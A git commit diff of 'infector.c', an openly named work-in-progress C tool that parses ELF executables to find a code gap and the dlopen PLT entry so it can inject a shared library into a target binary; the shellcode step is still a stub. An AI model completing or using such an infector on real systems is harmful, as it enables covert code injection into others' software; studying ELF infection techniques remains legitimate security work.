6673cec725cf6561f7e8883b705103f8518f7d24
Jordan Whitehead <jordan9001@gmail.com>
2017-10-27 11:35:52 -0400

    This is gross, I should have used elf.h

--- infector.c
+++ infector.c
@@ -21,9 +21,16 @@
 #define ELF_HEAD_PHENTSIZE_OFFSET	0x36
 #define ELF_HEAD_PHNUM_OFFSET		0x38
 #define ELF_HEAD_SIZE			0x40
+#define ELF_HEAD_STRSECIND		0x3E
 #define ELF_SECTION_VADDR		0x10
 #define ELF_SECTION_FILEOFF		0x18
 #define ELF_SECTION_SIZE		0x20
+#define ELF_SECTION_SHNAME		0x00
+#define ELF_SECTION_TYPE		0x04
+#define ELF_SECTION_ATTRIBUTES		0x08
+#define ELF_SECTION_LINK		0x28
+#define ELF_SECTION_INFO		0x2C
+#define ELF_SECTION_ENTSIZE		0x38
 #define ELF_PHEAD_TYPE			0x00
 #define ELF_PHEAD_PFLAGS		0x04
 #define ELF_PHEAD_FILEOFF		0x08
@@ -31,6 +38,7 @@
 #define ELF_PHEAD_FILESZ		0x20
 #define ELF_PT_LOAD			0x01
 #define ELF_EXEC_FLAGS			0x11
+#define ELF_STRTAB_SIZE			24
 
 #define START_REXMOV_CODE		((char[]){0x48, 0xc7, 0xc7})
 #define START_REXMOV_LEN		3 
@@ -40,8 +48,11 @@
 #define START_REXLEA_LEN		3
 #define START_REXLEA_ADDRLEN		4
 
+// macros
+#define ELF64_R_TYPE_DATA(info)       (((Elf64_Xword)(info)<<32)>>40)
+#define ELF64_R_TYPE_ID(info)         (((Elf64_Xword)(info)<<56)>>56)
+#define ELF64_R_TYPE_INFO(data, type) (((Elf64_Xword)(data)<<8) + (Elf64_Xword)(type))
 // helpful types
-typedef uint64_t offset_t;
 
 typedef struct main_arg_t {
 	uint8_t* file_ptr;
@@ -56,11 +67,17 @@ typedef struct empty_area_t {
 	uint64_t size;
 } empty_area_t;
 
+typedef struct plt_entry_t {
+	uint64_t fileoffset;
+	uint64_t vaddr;
+} plt_entry_t;
+
 // static helper functions
 static void print_usage();
 static int open_and_map(char* fname, uint8_t** data, size_t* len);
 static int find_arg_main(uint8_t* elf, main_arg_t* res);
 static int find_gap(uint8_t* elf_base, empty_area_t* area);
+static int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt);
 
 void print_usage(char* progname) {
 	printf("Usage : %s /path/to/elf /path/to/lib exported_func\n", progname);
@@ -100,15 +117,15 @@ int open_and_map(char* fname, uint8_t** data, size_t* len) {
 
 int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
 	uint8_t type;
-	offset_t startoff;
-	offset_t section_off;
+	uint64_t startoff;
+	uint64_t section_off;
 	uint16_t section_entry_size;
 	uint16_t section_entry_count;
 	uint8_t* cursor;
 	int i;
-	offset_t section_vaddr;
-	offset_t section_size;
-	offset_t text_file_offset = 0;
+	uint64_t section_vaddr;
+	uint64_t section_size;
+	uint64_t text_file_offset = 0;
 	uint32_t main_addr;
 	
 	// first find the _start
@@ -121,12 +138,12 @@ int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
 	}
 
 	// get the entry pointer (which is an offset to us)
-	startoff = *((offset_t*)(elf_base + ELF_HEAD_ENTRY_OFFSET));
+	startoff = *((uint64_t*)(elf_base + ELF_HEAD_ENTRY_OFFSET));
 
 	printf("Found _start at %p\n", (void*)startoff);
 
 	// parse the section entries for .text
-	section_off = (*(offset_t*)(elf_base + ELF_HEAD_SHOFF_OFFSET));
+	section_off = (*(uint64_t*)(elf_base + ELF_HEAD_SHOFF_OFFSET));
 	section_entry_size = *((uint16_t*)(elf_base + ELF_HEAD_SHENTSIZE_OFFSET));
 	section_entry_count = *((uint16_t*)(elf_base + ELF_HEAD_SHNUM_OFFSET));
 
@@ -136,10 +153,10 @@ int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
 	// we don't want to go looking for section strings, because those can be stripped
 	// so we will check for the section that contains our _start
 	for (i = 0; i < section_entry_count; i++, cursor += section_entry_size) {
-		section_vaddr = *((offset_t*)(cursor + ELF_SECTION_VADDR));
-		section_size = *((offset_t*)(cursor + ELF_SECTION_SIZE));
+		section_vaddr = *((uint64_t*)(cursor + ELF_SECTION_VADDR));
+		section_size = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
 		if (section_vaddr <= startoff && (section_vaddr + section_size) > startoff) {
-			text_file_offset = *((offset_t*)(cursor + ELF_SECTION_FILEOFF));
+			text_file_offset = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
 			break;
 		}
 	}
@@ -200,7 +217,7 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 	// We need to find the executable one
 	// then we need to find a loaded section right next to the end of the executable tl_load, so we know our gap size in the file
 
-	offset_t phoff;
+	uint64_t phoff;
 	uint16_t phentsize;
 	uint16_t phnum;
 	uint8_t* cursor;
@@ -214,7 +231,7 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 	uint64_t text_end = 0;
 	uint64_t pad_len = -1;
 
-	phoff = *((offset_t*)(elf_base + ELF_HEAD_PHOFF_OFFSET));
+	phoff = *((uint64_t*)(elf_base + ELF_HEAD_PHOFF_OFFSET));
 	phentsize = *((uint16_t*)(elf_base + ELF_HEAD_PHENTSIZE_OFFSET));
 	phnum = *((uint16_t*)(elf_base + ELF_HEAD_PHNUM_OFFSET));
 
@@ -269,12 +286,139 @@ int find_gap(uint8_t* elf_base, empty_area_t* area) {
 	return 0;
 }
 
+int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt) {
+	uint64_t section_off;
+	uint16_t section_entry_size;
+	uint16_t section_entry_count;
+	uint16_t string_sec_index;
+	uint8_t* cursor;
+	uint8_t* string_sec_base;
+	uint32_t shname_off;
+	uint32_t shinfo_i;
+	uint32_t shlink_i;
+	//uint64_t shvaddr;
+	uint64_t shfile_off;
+	uint64_t shsize;
+	uint32_t shtype;
+	uint64_t shflags;
+	//uint64_t shentsize;
+	int i;
+	uint8_t* infoptr = NULL;
+	uint64_t infosz = 0;
+	uint8_t* linkptr = NULL;
+	uint64_t linksz = 0;
+	uint8_t* linklinkptr = NULL;
+	uint64_t linklinksz = 0;
+	uint8_t* relapltptr = NULL;
+	uint64_t relapltsz = 0;
+
+	// NOTES
+	// Because we need dlopen and dlsym, we are just going to depend on the plt already having our things
+	// so, we need to read the .rela.plt, and use the info section to find the index in the .dynsym
+	// #define ELF32_R_SYM(val) ((val) >> 8)
+	// #define ELF32_R_TYPE(val) ((val) & 0xff)
+
+	// for now, just go through the section header
+
+	section_off = *((uint64_t*)(elf_base + ELF_HEAD_SHOFF_OFFSET));
+	section_entry_size = *((uint16_t*)(elf_base + ELF_HEAD_SHENTSIZE_OFFSET));
+	section_entry_count = *((uint16_t*)(elf_base + ELF_HEAD_SHNUM_OFFSET));
+	string_sec_index = *((uint16_t*)(elf_base + ELF_HEAD_STRSECIND));
+
+	cursor = elf_base + section_off;
+
+	// first go to the string section
+	cursor += (string_sec_index * section_entry_size);
+	shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
+	string_sec_base = elf_base + shfile_off;
+	
+	cursor = elf_base + section_off;
+
+	// go through the symbol table
+	for (i = 0; i < section_entry_count; i++, cursor += section_entry_size) {
+		shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
+		//shvaddr = *((uint64_t*)(cursor + ELF_SECTION_VADDR));
+		shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
+		shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
+		shtype = *((uint32_t*)(cursor + ELF_SECTION_TYPE));
+		shflags = *((uint64_t*)(cursor + ELF_SECTION_ATTRIBUTES));
+		//shentsize = *((uint64_t*)(cursor + ELF_SECTION_ENTSIZE));
+		shinfo_i = *((uint32_t*)(cursor + ELF_SECTION_INFO));
+		shlink_i = *((uint32_t*)(cursor + ELF_SECTION_LINK));
+		
+		printf("%d %s : %x %lx\n", i, string_sec_base + shname_off, shtype, shflags); 
+
+		// if we find .plt, .rela.plt or .dynstr, keep track of it
+		if (strstr((char*)string_sec_base + shname_off, ".rela.plt")) {
+			printf("Found .rela.plt @ %lx\n", shfile_off);
+			relapltptr = elf_base + shfile_off;
+			relapltsz = shsize;
+	
+			// the plt section referenced is in sh_info
+			cursor = (elf_base + section_off) + (shinfo_i * section_entry_size);
+			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
+			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
+			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
+			infoptr = elf_base + shfile_off;	
+			infosz = shsize;
+			printf("info = %s %d\n", string_sec_base + shname_off, shinfo_i); 
+			
+			// the dynsym? is referenced in sh_link
+			cursor = (elf_base + section_off) + (shlink_i * section_entry_size);
+			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
+			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
+			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
+			linkptr = elf_base + shfile_off;	
+			linksz = shsize;
+			printf("link = %s %d\n", string_sec_base + shname_off, shlink_i); 
+
+			shlink_i = *((uint32_t*)(cursor + ELF_SECTION_LINK));
+			// the dynstr? is referenced in sh_link
+			cursor = (elf_base + section_off) + (shlink_i * section_entry_size);
+			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
+			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
+			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
+			linklinkptr = elf_base + shfile_off;	
+			linklinksz = shsize;
+			printf("linklink = %s %d\n", string_sec_base + shname_off, shlink_i); 
+			
+			break;
+			//DEBUG
+			//cursor = (elf_base + section_off) + (i * section_entry_size);
+		}
+	}
+
+	// go through .rela.plt, finding the function's plt
+	// DEBUG
+	printf ("rela.plt @ %p %lx\n", (void*)(relapltptr - elf_base), relapltsz);
+	printf ("info @ %p %lx\n", (void*)(infoptr - elf_base), infosz);
+	printf ("link @ %p %lx\n", (void*)(linkptr - elf_base), linksz);
+	printf ("linklink @ %p %lx\n", (void*)(linklinkptr - elf_base), linklinksz);
+	// print out the rela.plt
+	for (i=0; i<relapltsz; i += sizeof(uint64_t)) {
+		printf("%016lx%s", *(uint64_t*)(relapltptr + i), ((i+8)%24)?" ":"\n");
+	}
+	// print out the dynsym
+	// this is gross code, I should have just used elf.h
+	for (i=0; i<linksz; i += ELF_STRTAB_SIZE) {
+		printf("%s\n", linklinkptr + *(uint32_t*)(linkptr + i));
+	}
+	printf("\n");
+	
+
+	return 0;
+}
+	
+
 int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	int tfd;
 	uint8_t* tdata;
 	size_t tdata_len;
 	main_arg_t arg_main;
 	empty_area_t pad_area;
+	plt_entry_t dlopen_plt;
+	
+
 	// open and map target
 	tfd = open_and_map(target_path, &tdata, &tdata_len);
 	if (tfd == -1) {
@@ -299,13 +443,13 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	}
 	printf("foff = %lx, vaddr = %lx, len = %lx\n", pad_area.fileoffset, pad_area.vaddr, pad_area.size);
 
-	// grab the shellcode
+	// get the needed symbols
+	if (find_plt(tdata, "dlopen", &dlopen_plt)) {
+		printf("Couldn't find dlopen!\n");
+		return -1;
+	}
 
-	// NOTES
-	// Because we need dlopen and dlsym, we are just going to depend on the plt already having our things
-	// so, we need to read the .rela.plt, and use the info section to find the index in the .dynsym
-	// #define ELF32_R_SYM(val) ((val) >> 8)
-	// #define ELF32_R_TYPE(val) ((val) & 0xff)
+	// grab the shellcode
 
 	// give the shellcode the needed addresses on the end, in the correct positions
 	// #1 Original Main
@@ -331,7 +475,10 @@ int main(int argc, char** argv) {
 		exit(-1);
 	}
 
-	do_infect(argv[1], argv[2], argv[3]);
+	if (do_infect(argv[1], argv[2], argv[3])) {
+		printf("Failed\n");
+	}
+	printf("Success\n");
 	
 	return 0;
 
